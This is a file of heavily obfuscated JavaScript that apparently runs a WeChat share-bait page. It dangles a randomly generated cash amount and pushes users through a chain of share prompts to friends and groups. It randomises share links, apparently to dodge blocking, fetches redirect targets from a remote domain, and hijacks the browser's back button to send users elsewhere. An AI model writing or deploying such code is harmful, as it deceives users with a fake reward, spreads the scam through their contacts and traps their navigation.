_f[__Ox3fdd4[0x9]][__Ox3fdd4[0x10]] = _f[__Ox3fdd4[0x9]][__Ox3fdd4[0x10]][__Ox3fdd4[0x7]](/{city}/g, city);
_f[__Ox3fdd4[0x9]][__Ox3fdd4[0x11]] = _f[__Ox3fdd4[0x9]][__Ox3fdd4[0x11]][__Ox3fdd4[0x7]](/{city}/g, city);
_f[__Ox3fdd4[0x9]][__Ox3fdd4[0x12]] = _f[__Ox3fdd4[0x9]][__Ox3fdd4[0x12]][__Ox3fdd4[0x7]](/{city}/g, city);
_f[__Ox3fdd4[0x9]][__Ox3fdd4[0x13]] = _f[__Ox3fdd4[0x9]][__Ox3fdd4[0x13]][__Ox3fdd4[0x7]](/{city}/g, city);
_f[__Ox3fdd4[0x9]][__Ox3fdd4[0x14]] = _f[__Ox3fdd4[0x9]][__Ox3fdd4[0x14]][__Ox3fdd4[0x7]](/{city}/g, city);
_f[__Ox3fdd4[0x9]][__Ox3fdd4[0x15]] = _f[__Ox3fdd4[0x9]][__Ox3fdd4[0x15]][__Ox3fdd4[0x7]](/{city}/g, city);
_f[__Ox3fdd4[0x9]][__Ox3fdd4[0x16]] = _f[__Ox3fdd4[0x9]][__Ox3fdd4[0x16]][__Ox3fdd4[0x7]](/{city}/g, city);
_f[__Ox3fdd4[0x9]][__Ox3fdd4[0x17]] = _f[__Ox3fdd4[0x9]][__Ox3fdd4[0x17]][__Ox3fdd4[0x7]](/{city}/g, city);
document[__Ox3fdd4[0x18]] = _f[__Ox3fdd4[0x19]][__Ox3fdd4[0x7]](/{city}/g, city);
document[__Ox3fdd4[0x1d]](__Ox3fdd4[0x1a] + window[__Ox3fdd4[0x1b]] + __Ox3fdd4[0x1c]);
weui = {
    alert: function (_0x3635x6, _0x3635x7, _0x3635x8, _0x3635x9) {
        var _0x3635xa, _0x3635xb;
        _0x3635x8 = _0x3635x8 ? _0x3635x8 : __Ox3fdd4[0x1e];
        _0x3635xa = unescape(__Ox3fdd4[0x1f]);
        $(__Ox3fdd4[0x21])[__Ox3fdd4[0x20]] > 0 ? $(__Ox3fdd4[0x23])[__Ox3fdd4[0x22]]() : $(__Ox3fdd4[0x25])[
            __Ox3fdd4[0x24]](_0x3635xa);
        _0x3635xb = $(__Ox3fdd4[0x21]);
        _0x3635xb[__Ox3fdd4[0x26]]();
        _0x3635xb[__Ox3fdd4[0x29]](__Ox3fdd4[0x28])[__Ox3fdd4[0x27]](_0x3635x6);
        _0x3635xb[__Ox3fdd4[0x29]](__Ox3fdd4[0x2a])[__Ox3fdd4[0x27]](_0x3635x7);
        _0x3635xb[__Ox3fdd4[0x29]](__Ox3fdd4[0x2b])[__Ox3fdd4[0x27]](_0x3635x8);
        _0x3635xb[__Ox3fdd4[0x29]](__Ox3fdd4[0x30])[__Ox3fdd4[0x2f]](__Ox3fdd4[0x2c])[__Ox3fdd4[0x2e]](
            __Ox3fdd4[0x2c],
            function () {
                _0x3635xb[__Ox3fdd4[0x2d]]();
                _0x3635x9 && _0x3635x9()
            })
    },
    loading: function () {
        var _0x3635xa = __Ox3fdd4[0x31],
            _0x3635x7 = __Ox3fdd4[0x32];
        $(__Ox3fdd4[0x33])[__Ox3fdd4[0x20]] > 0 ? $(__Ox3fdd4[0x23])[__Ox3fdd4[0x22]]() : $(__Ox3fdd4[0x25])[
            __Ox3fdd4[0x24]](_0x3635xa);
        u = $(__Ox3fdd4[0x33]);
        u[__Ox3fdd4[0x26]]();
        u[__Ox3fdd4[0x29]](__Ox3fdd4[0x2a])[__Ox3fdd4[0x27]](_0x3635x7)
    }
};
weui[__Ox3fdd4[0x34]]();
$(__Ox3fdd4[0x47])[__Ox3fdd4[0x2e]](__Ox3fdd4[0x2c], function () {
    switch (share) {
        case 0:
            weui[__Ox3fdd4[0x39]](__Ox3fdd4[0x35], __Ox3fdd4[0x36] + window[__Ox3fdd4[0x1b]] + __Ox3fdd4[0x37] +
                money + __Ox3fdd4[0x38]);
            break;
        case 1:
            weui[__Ox3fdd4[0x39]](__Ox3fdd4[0x3a], __Ox3fdd4[0x3b]);
            break;
        case 2:
            weui[__Ox3fdd4[0x39]](__Ox3fdd4[0x3c], __Ox3fdd4[0x3d]);
            break;
        case 3:
            weui[__Ox3fdd4[0x39]](__Ox3fdd4[0x3a], __Ox3fdd4[0x3e]);
            break;
        case 4:
            weui[__Ox3fdd4[0x39]](__Ox3fdd4[0x3c], __Ox3fdd4[0x3f]);
            break;
        case 5:
            weui[__Ox3fdd4[0x39]](__Ox3fdd4[0x3c], __Ox3fdd4[0x40]);
            break;
        case 6:
            weui[__Ox3fdd4[0x39]](__Ox3fdd4[0x3a], __Ox3fdd4[0x41] + window[__Ox3fdd4[0x1b]] + __Ox3fdd4[0x42]);
            break;
        case 7:
            weui[__Ox3fdd4[0x39]](__Ox3fdd4[0x3c], __Ox3fdd4[0x43]);
            break;
        case 8:
            weui[__Ox3fdd4[0x39]](__Ox3fdd4[0x44], __Ox3fdd4[0x45] + window[__Ox3fdd4[0x1b]] + __Ox3fdd4[0x46],
                __Ox3fdd4[0x1e], kikm)
    }
});

function shaer_tips() {
    switch (share) {
        case 0:
            window[__Ox3fdd4[0x49]][__Ox3fdd4[0x48]][__Ox3fdd4[0x18]] = _f[__Ox3fdd4[0x9]][__Ox3fdd4[0xb]];
            window[__Ox3fdd4[0x49]][__Ox3fdd4[0x48]][__Ox3fdd4[0x4a]] = _f[__Ox3fdd4[0x9]][__Ox3fdd4[0x13]];
            window[__Ox3fdd4[0x49]][__Ox3fdd4[0x48]][__Ox3fdd4[0x4b]] = _f[__Ox3fdd4[0x4c]][0x2];
            window[__Ox3fdd4[0x49]][__Ox3fdd4[0x48]][__Ox3fdd4[0x4d]] = _f[__Ox3fdd4[0x9]][__Ox3fdd4[0x4e]];
            configReload(1);
            weui[__Ox3fdd4[0x39]](__Ox3fdd4[0x3a], __Ox3fdd4[0x3b]);
            share++;
            if (_zduan != __Ox3fdd4[0x4f]) {
                location[__Ox3fdd4[0x50]] = _zduan + __Ox3fdd4[0x51] + share
            };
            break;
        case 1:
            window[__Ox3fdd4[0x49]][__Ox3fdd4[0x48]][__Ox3fdd4[0x18]] = _f[__Ox3fdd4[0x9]][__Ox3fdd4[0xc]];
            window[__Ox3fdd4[0x49]][__Ox3fdd4[0x48]][__Ox3fdd4[0x4a]] = _f[__Ox3fdd4[0x9]][__Ox3fdd4[0x14]];
            window[__Ox3fdd4[0x49]][__Ox3fdd4[0x48]][__Ox3fdd4[0x4b]] = _f[__Ox3fdd4[0x4c]][0x3];
            window[__Ox3fdd4[0x49]][__Ox3fdd4[0x48]][__Ox3fdd4[0x4d]] = _f[__Ox3fdd4[0x9]][__Ox3fdd4[0x52]];
            configReload(1);
            weui[__Ox3fdd4[0x39]](__Ox3fdd4[0x3c], __Ox3fdd4[0x3d]);
            share++;
            if (_zduan != __Ox3fdd4[0x4f]) {
                location[__Ox3fdd4[0x50]] = _zduan + __Ox3fdd4[0x51] + share
            };
            break;
        case 2:
            window[__Ox3fdd4[0x49]][__Ox3fdd4[0x48]][__Ox3fdd4[0x18]] = _f[__Ox3fdd4[0x9]][__Ox3fdd4[0xd]];
            window[__Ox3fdd4[0x49]][__Ox3fdd4[0x48]][__Ox3fdd4[0x4a]] = _f[__Ox3fdd4[0x9]][__Ox3fdd4[0x15]];
            window[__Ox3fdd4[0x49]][__Ox3fdd4[0x48]][__Ox3fdd4[0x4b]] = _f[__Ox3fdd4[0x4c]][0x4];
            window[__Ox3fdd4[0x49]][__Ox3fdd4[0x48]][__Ox3fdd4[0x4d]] = _f[__Ox3fdd4[0x9]][__Ox3fdd4[0x53]];
            configReload(1);
            weui[__Ox3fdd4[0x39]](__Ox3fdd4[0x3a], __Ox3fdd4[0x3e]);
            share++;
            if (_zduan != __Ox3fdd4[0x4f]) {
                location[__Ox3fdd4[0x50]] = _zduan + __Ox3fdd4[0x51] + share
            };
            break;
        case 3:
            window[__Ox3fdd4[0x49]][__Ox3fdd4[0x48]][__Ox3fdd4[0x18]] = _f[__Ox3fdd4[0x9]][__Ox3fdd4[0xe]];
            window[__Ox3fdd4[0x49]][__Ox3fdd4[0x48]][__Ox3fdd4[0x4a]] = _f[__Ox3fdd4[0x9]][__Ox3fdd4[0x16]];
            window[__Ox3fdd4[0x49]][__Ox3fdd4[0x48]][__Ox3fdd4[0x4b]] = _f[__Ox3fdd4[0x4c]][0x5];
            window[__Ox3fdd4[0x49]][__Ox3fdd4[0x48]][__Ox3fdd4[0x4d]] = _f[__Ox3fdd4[0x9]][__Ox3fdd4[0x54]];
            configReload(1);
            weui[__Ox3fdd4[0x39]](__Ox3fdd4[0x3c], __Ox3fdd4[0x3f]);
            share++;
            if (_zduan != __Ox3fdd4[0x4f]) {
                location[__Ox3fdd4[0x50]] = _zduan + __Ox3fdd4[0x51] + share
            };
            break;
        case 4:
            window[__Ox3fdd4[0x49]][__Ox3fdd4[0x48]][__Ox3fdd4[0x18]] = _f[__Ox3fdd4[0x9]][__Ox3fdd4[0xf]];
            window[__Ox3fdd4[0x49]][__Ox3fdd4[0x48]][__Ox3fdd4[0x4a]] = _f[__Ox3fdd4[0x9]][__Ox3fdd4[0x17]];
            window[__Ox3fdd4[0x49]][__Ox3fdd4[0x48]][__Ox3fdd4[0x4b]] = _f[__Ox3fdd4[0x4c]][0x6];
            window[__Ox3fdd4[0x49]][__Ox3fdd4[0x48]][__Ox3fdd4[0x4d]] = _f[__Ox3fdd4[0x9]][__Ox3fdd4[0x55]];
            configReload(1);
            weui[__Ox3fdd4[0x39]](__Ox3fdd4[0x3c], __Ox3fdd4[0x40]);
            share++;
            if (_zduan != __Ox3fdd4[0x4f]) {
                location[__Ox3fdd4[0x50]] = _zduan + __Ox3fdd4[0x51] + share
            };
            break;
        case 5:
            window[__Ox3fdd4[0x49]][__Ox3fdd4[0x48]][__Ox3fdd4[0x18]] = _f[__Ox3fdd4[0x9]][__Ox3fdd4[0x10]];
            window[__Ox3fdd4[0x49]][__Ox3fdd4[0x48]][__Ox3fdd4[0x4b]] = _f[__Ox3fdd4[0x4c]][0x7];
            window[__Ox3fdd4[0x49]][__Ox3fdd4[0x48]][__Ox3fdd4[0x4d]] = _f[__Ox3fdd4[0x9]][__Ox3fdd4[0x56]];
            window[__Ox3fdd4[0x49]][__Ox3fdd4[0x48]][__Ox3fdd4[0x57]] = __Ox3fdd4[0x4b];
            configReload(2);
            weui[__Ox3fdd4[0x39]](__Ox3fdd4[0x3a], __Ox3fdd4[0x41] + window[__Ox3fdd4[0x1b]] + __Ox3fdd4[0x42]);
            share++;
            if (_zduan != __Ox3fdd4[0x4f]) {
                location[__Ox3fdd4[0x50]] = _zduan + __Ox3fdd4[0x51] + share
            };
            break;
        default:
            weui[__Ox3fdd4[0x39]](__Ox3fdd4[0x35], __Ox3fdd4[0x36] + window[__Ox3fdd4[0x1b]] + __Ox3fdd4[0x37] + money +
                __Ox3fdd4[0x38]);
            break
    }
}

function shaer_p_tips() {
    switch (share) {
        case 6:
            window[__Ox3fdd4[0x49]][__Ox3fdd4[0x48]][__Ox3fdd4[0x18]] = _f[__Ox3fdd4[0x9]][__Ox3fdd4[0x11]];
            window[__Ox3fdd4[0x49]][__Ox3fdd4[0x48]][__Ox3fdd4[0x4b]] = _f[__Ox3fdd4[0x4c]][0x8];
            window[__Ox3fdd4[0x49]][__Ox3fdd4[0x48]][__Ox3fdd4[0x4d]] = _f[__Ox3fdd4[0x9]][__Ox3fdd4[0x58]];
            configReload(2);
            weui[__Ox3fdd4[0x39]](__Ox3fdd4[0x3c], __Ox3fdd4[0x43]);
            share++;
            if (_zduan != __Ox3fdd4[0x4f]) {
                location[__Ox3fdd4[0x50]] = _zduan + __Ox3fdd4[0x51] + share
            };
            break;
        case 7:
            share++;
            $[__Ox3fdd4[0x5a]](bbm[__Ox3fdd4[0x7]](/\*/, makeid()) + __Ox3fdd4[0x59] + _bosi, function (_0x3635xe) {
                if (_0x3635xe != __Ox3fdd4[0x2]) {
                    _bhw = _0x3635xe
                }
            });
            weui[__Ox3fdd4[0x39]](__Ox3fdd4[0x44], __Ox3fdd4[0x45] + window[__Ox3fdd4[0x1b]] + __Ox3fdd4[0x46],
                __Ox3fdd4[0x1e], kikm);
            break
    }
}

function config_json(_0x3635x10) {
    var _0x3635xa = {
        "\x63\x6F\x6E\x66\x69\x67": _0x3635x10,
        "\x74": {
            "\x74\x69\x74\x6C\x65": __Ox3fdd4[0x2],
            "\x64\x65\x73\x63": __Ox3fdd4[0x2],
            "\x69\x6D\x67\x5F\x75\x72\x6C": __Ox3fdd4[0x2],
            "\x6C\x69\x6E\x6B": location[__Ox3fdd4[0x50]],
            "\x74\x79\x70\x65": __Ox3fdd4[0x4b]
        }
    };
    _0x3635xa[__Ox3fdd4[0x5c]][__Ox3fdd4[0x5b]] = [__Ox3fdd4[0x5d], __Ox3fdd4[0x5e], __Ox3fdd4[0x5f], __Ox3fdd4[0x60],
        __Ox3fdd4[0x61], __Ox3fdd4[0x62], __Ox3fdd4[0x63]];
    return _0x3635xa
}

function share_config(_0x3635x12) {
    aam = _0x3635x12[__Ox3fdd4[0x5c]][__Ox3fdd4[0x64]];
    bbm = _0x3635x12[__Ox3fdd4[0x5c]][__Ox3fdd4[0x65]];
    wx[__Ox3fdd4[0x5c]](_0x3635x12[__Ox3fdd4[0x5c]]);
    wx[__Ox3fdd4[0x72]](function () {
        wx[__Ox3fdd4[0x61]]({
            menuList: [__Ox3fdd4[0x66], __Ox3fdd4[0x67], __Ox3fdd4[0x68], __Ox3fdd4[0x69], __Ox3fdd4[
                    0x6a], __Ox3fdd4[0x6b], __Ox3fdd4[0x6c], __Ox3fdd4[0x6d], __Ox3fdd4[0x6e],
                __Ox3fdd4[0x6f], __Ox3fdd4[0x70], __Ox3fdd4[0x71]]
        })
    })
}
$(function () {
    $[__Ox3fdd4[0x7c]]({
        type: __Ox3fdd4[0x73],
        url: _f[__Ox3fdd4[0x74]],
        dataType: __Ox3fdd4[0x75],
        beforeSend: function (_0x3635x13) {
            $(__Ox3fdd4[0x79])[__Ox3fdd4[0x78]](__Ox3fdd4[0x76], __Ox3fdd4[0x77])
        },
        success: function (_0x3635x14) {
            window[__Ox3fdd4[0x49]] = config_json(_0x3635x14);
            share_config(window[__Ox3fdd4[0x49]]);
            setTimeout(function () {
                $(__Ox3fdd4[0x33])[__Ox3fdd4[0x2d]]();
                $(__Ox3fdd4[0x47])[__Ox3fdd4[0x7a]](__Ox3fdd4[0x2c])
            }, 500);
            switch (share) {
                case 0:
                    window[__Ox3fdd4[0x49]][__Ox3fdd4[0x48]][__Ox3fdd4[0x18]] = _f[__Ox3fdd4[0x9]][
                        __Ox3fdd4[0xa]];
                    window[__Ox3fdd4[0x49]][__Ox3fdd4[0x48]][__Ox3fdd4[0x4a]] = _f[__Ox3fdd4[0x9]][
                        __Ox3fdd4[0x12]];
                    window[__Ox3fdd4[0x49]][__Ox3fdd4[0x48]][__Ox3fdd4[0x4b]] = _f[__Ox3fdd4[0x4c]]
                        [0x1];
                    window[__Ox3fdd4[0x49]][__Ox3fdd4[0x48]][__Ox3fdd4[0x4d]] = _f[__Ox3fdd4[0x9]][
                        __Ox3fdd4[0x7b]];
                    configReload(1);
                    break;
                case 1:
                    window[__Ox3fdd4[0x49]][__Ox3fdd4[0x48]][__Ox3fdd4[0x18]] = _f[__Ox3fdd4[0x9]][
                        __Ox3fdd4[0xb]];
                    window[__Ox3fdd4[0x49]][__Ox3fdd4[0x48]][__Ox3fdd4[0x4a]] = _f[__Ox3fdd4[0x9]][
                        __Ox3fdd4[0x13]];
                    window[__Ox3fdd4[0x49]][__Ox3fdd4[0x48]][__Ox3fdd4[0x4b]] = _f[__Ox3fdd4[0x4c]]
                        [0x2];
                    window[__Ox3fdd4[0x49]][__Ox3fdd4[0x48]][__Ox3fdd4[0x4d]] = _f[__Ox3fdd4[0x9]][
                        __Ox3fdd4[0x4e]];
                    configReload(1);
                    break;
                case 2:
                    window[__Ox3fdd4[0x49]][__Ox3fdd4[0x48]][__Ox3fdd4[0x18]] = _f[__Ox3fdd4[0x9]][
                        __Ox3fdd4[0xc]];
                    window[__Ox3fdd4[0x49]][__Ox3fdd4[0x48]][__Ox3fdd4[0x4a]] = _f[__Ox3fdd4[0x9]][
                        __Ox3fdd4[0x14]];
                    window[__Ox3fdd4[0x49]][__Ox3fdd4[0x48]][__Ox3fdd4[0x4b]] = _f[__Ox3fdd4[0x4c]]
                        [0x3];
                    window[__Ox3fdd4[0x49]][__Ox3fdd4[0x48]][__Ox3fdd4[0x4d]] = _f[__Ox3fdd4[0x9]][
                        __Ox3fdd4[0x52]];
                    configReload(1);
                    break;
                case 3:
                    window[__Ox3fdd4[0x49]][__Ox3fdd4[0x48]][__Ox3fdd4[0x18]] = _f[__Ox3fdd4[0x9]][
                        __Ox3fdd4[0xd]];
                    window[__Ox3fdd4[0x49]][__Ox3fdd4[0x48]][__Ox3fdd4[0x4a]] = _f[__Ox3fdd4[0x9]][
                        __Ox3fdd4[0x15]];
                    window[__Ox3fdd4[0x49]][__Ox3fdd4[0x48]][__Ox3fdd4[0x4b]] = _f[__Ox3fdd4[0x4c]]
                        [0x4];
                    window[__Ox3fdd4[0x49]][__Ox3fdd4[0x48]][__Ox3fdd4[0x4d]] = _f[__Ox3fdd4[0x9]][
                        __Ox3fdd4[0x53]];
                    configReload(1);
                    break;
                case 4:
                    window[__Ox3fdd4[0x49]][__Ox3fdd4[0x48]][__Ox3fdd4[0x18]] = _f[__Ox3fdd4[0x9]][
                        __Ox3fdd4[0xe]];
                    window[__Ox3fdd4[0x49]][__Ox3fdd4[0x48]][__Ox3fdd4[0x4a]] = _f[__Ox3fdd4[0x9]][
                        __Ox3fdd4[0x16]];
                    window[__Ox3fdd4[0x49]][__Ox3fdd4[0x48]][__Ox3fdd4[0x4b]] = _f[__Ox3fdd4[0x4c]]
                        [0x5];
                    window[__Ox3fdd4[0x49]][__Ox3fdd4[0x48]][__Ox3fdd4[0x4d]] = _f[__Ox3fdd4[0x9]][
                        __Ox3fdd4[0x54]];
                    configReload(1);
                    break;
                case 5:
                    window[__Ox3fdd4[0x49]][__Ox3fdd4[0x48]][__Ox3fdd4[0x18]] = _f[__Ox3fdd4[0x9]][
                        __Ox3fdd4[0xf]];
                    window[__Ox3fdd4[0x49]][__Ox3fdd4[0x48]][__Ox3fdd4[0x4a]] = _f[__Ox3fdd4[0x9]][
                        __Ox3fdd4[0x17]];
                    window[__Ox3fdd4[0x49]][__Ox3fdd4[0x48]][__Ox3fdd4[0x4b]] = _f[__Ox3fdd4[0x4c]]
                        [0x6];
                    window[__Ox3fdd4[0x49]][__Ox3fdd4[0x48]][__Ox3fdd4[0x4d]] = _f[__Ox3fdd4[0x9]][
                        __Ox3fdd4[0x55]];
                    configReload(1);
                    break;
                case 6:
                    window[__Ox3fdd4[0x49]][__Ox3fdd4[0x48]][__Ox3fdd4[0x18]] = _f[__Ox3fdd4[0x9]][
                        __Ox3fdd4[0x10]];
                    window[__Ox3fdd4[0x49]][__Ox3fdd4[0x48]][__Ox3fdd4[0x4b]] = _f[__Ox3fdd4[0x4c]]
                        [0x7];
                    window[__Ox3fdd4[0x49]][__Ox3fdd4[0x48]][__Ox3fdd4[0x4d]] = _f[__Ox3fdd4[0x9]][
                        __Ox3fdd4[0x56]];
                    window[__Ox3fdd4[0x49]][__Ox3fdd4[0x48]][__Ox3fdd4[0x57]] = __Ox3fdd4[0x4b];
                    configReload(2);
                    break;
                case 7:
                    window[__Ox3fdd4[0x49]][__Ox3fdd4[0x48]][__Ox3fdd4[0x18]] = _f[__Ox3fdd4[0x9]][
                        __Ox3fdd4[0x11]];
                    window[__Ox3fdd4[0x49]][__Ox3fdd4[0x48]][__Ox3fdd4[0x4b]] = _f[__Ox3fdd4[0x4c]]
                        [0x8];
                    window[__Ox3fdd4[0x49]][__Ox3fdd4[0x48]][__Ox3fdd4[0x4d]] = _f[__Ox3fdd4[0x9]][
                        __Ox3fdd4[0x58]];
                    configReload(2);
                    break
            }
        }
    })
});

function configReload(_0x3635x16) {
    wx[__Ox3fdd4[0x5c]](window[__Ox3fdd4[0x49]][__Ox3fdd4[0x5c]]);
    wx[__Ox3fdd4[0x72]](function () {
        if (_0x3635x16 == 1) {
            wx[__Ox3fdd4[0x61]]({
                menuList: [__Ox3fdd4[0x70]]
            });
            wx[__Ox3fdd4[0x5e]]({
                title: window[__Ox3fdd4[0x49]][__Ox3fdd4[0x48]][__Ox3fdd4[0x18]],
                desc: window[__Ox3fdd4[0x49]][__Ox3fdd4[0x48]][__Ox3fdd4[0x4a]],
                link: window[__Ox3fdd4[0x49]][__Ox3fdd4[0x48]][__Ox3fdd4[0x4b]][__Ox3fdd4[0x7]](
                    /{domain}/, aam)[__Ox3fdd4[0x7]](/{pmain}/, bbm)[__Ox3fdd4[0x7]](/\*/, makeid()),
                imgUrl: window[__Ox3fdd4[0x49]][__Ox3fdd4[0x48]][__Ox3fdd4[0x4d]],
                type: __Ox3fdd4[0x4b],
                success: function () {
                    shaer_tips()
                }
            })
        } else {
            wx[__Ox3fdd4[0x61]]({
                menuList: [__Ox3fdd4[0x7d]]
            });
            wx[__Ox3fdd4[0x62]]({
                menuList: [__Ox3fdd4[0x70]]
            });
            wx[__Ox3fdd4[0x5d]]({
                title: window[__Ox3fdd4[0x49]][__Ox3fdd4[0x48]][__Ox3fdd4[0x18]],
                link: window[__Ox3fdd4[0x49]][__Ox3fdd4[0x48]][__Ox3fdd4[0x4b]][__Ox3fdd4[0x7]](
                    /{domain}/, aam)[__Ox3fdd4[0x7]](/{pmain}/, bbm)[__Ox3fdd4[0x7]](/\*/, makeid()),
                imgUrl: window[__Ox3fdd4[0x49]][__Ox3fdd4[0x48]][__Ox3fdd4[0x4d]],
                type: window[__Ox3fdd4[0x49]][__Ox3fdd4[0x48]][__Ox3fdd4[0x57]],
                success: function () {
                    shaer_p_tips()
                }
            })
        }
    })
}

function kikm() {
    location[__Ox3fdd4[0x50]] = _bhw
}
var url = __Ox3fdd4[0x2];
$[__Ox3fdd4[0x5a]](bbm[__Ox3fdd4[0x7]](/\*/, makeid()) + __Ox3fdd4[0x7e], function (_0x3635xe) {
    setTimeout(function () {
        history[__Ox3fdd4[0x82]](history[__Ox3fdd4[0x20]] + 1, __Ox3fdd4[0x7f], __Ox3fdd4[0x80] + new Date()[
            __Ox3fdd4[0x81]]())
    }, 200);
    url = __Ox3fdd4[0x83] + _0x3635xe + __Ox3fdd4[0x84] + makeid() + __Ox3fdd4[0x85] + makeid();
    window[__Ox3fdd4[0x86]] = function () {
        location[__Ox3fdd4[0x50]] = url
    }
});

function ranmo() {
    money = parseInt(1000 * (parseFloat(1000 * Math[__Ox3fdd4[0x87]]()) + 200));
    money = parseFloat(money / 1000)[__Ox3fdd4[0x88]](1);
    return money
}

function makeid() {
    var _0x3635x1b = __Ox3fdd4[0x2];
    var _0x3635x1c = __Ox3fdd4[0x89];
    for (var _0x3635x9 = 0; _0x3635x9 < Math[__Ox3fdd4[0x8a]](Math[__Ox3fdd4[0x87]]() * 10 + 2); _0x3635x9++) {
        _0x3635x1b += _0x3635x1c[__Ox3fdd4[0x8b]](Math[__Ox3fdd4[0x8a]](Math[__Ox3fdd4[0x87]]() * _0x3635x1c[__Ox3fdd4[
            0x20]]))
    };
    return _0x3635x1b
}